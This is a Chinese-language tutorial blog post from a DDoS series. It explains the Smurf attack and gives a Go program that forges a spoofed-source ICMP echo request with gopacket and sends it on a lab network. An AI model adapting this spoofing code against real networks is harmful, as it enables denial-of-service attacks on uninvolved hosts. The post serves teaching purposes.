---
author: Sunny Tsai
title: "[Day 26] 閑的沒事 - Smurf ddos"
date: 2023-10-09
math: true
tags: [
    "cloud",
    "smurf",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# Smurf DDOS
攻擊者發送大量偽造來源地址的ICMP封包，回應請求(ping)到目標主機，主要目的是消耗目標網絡的頻寬和資源，使其無法正常運作。
注：ICMP Flood是一種DoS攻擊，不像Smurf攻擊一樣偽造來源IP地址，只是連續地向目標主機發送ICMP消息，通常是ping請求。這將使目標主機的CPU和網絡資源耗盡，導致服務中斷。

# Code

```golang
package main

import (
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	handle, err := pcap.OpenLive("bridge100", 1024, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Ethernet layer
	eth := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		DstMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipLayer := &layers.IPv4{
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolICMPv4,
		SrcIP:    net.ParseIP("10.211.55.2"),
		DstIP:    net.ParseIP("10.211.55.10"),
	}

	icmpLayer := &layers.ICMPv4{
		TypeCode: layers.ICMPv4TypeEchoRequest,
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buffer, options, eth, ipLayer, icmpLayer, gopacket.Payload([]byte("Hello, ICMP!"))); err != nil {
		log.Fatal(err)
	}

	icmpPacket := buffer.Bytes()

	err = handle.WritePacketData(icmpPacket)
	if err != nil {
		log.Fatal(err)
	}
}
```
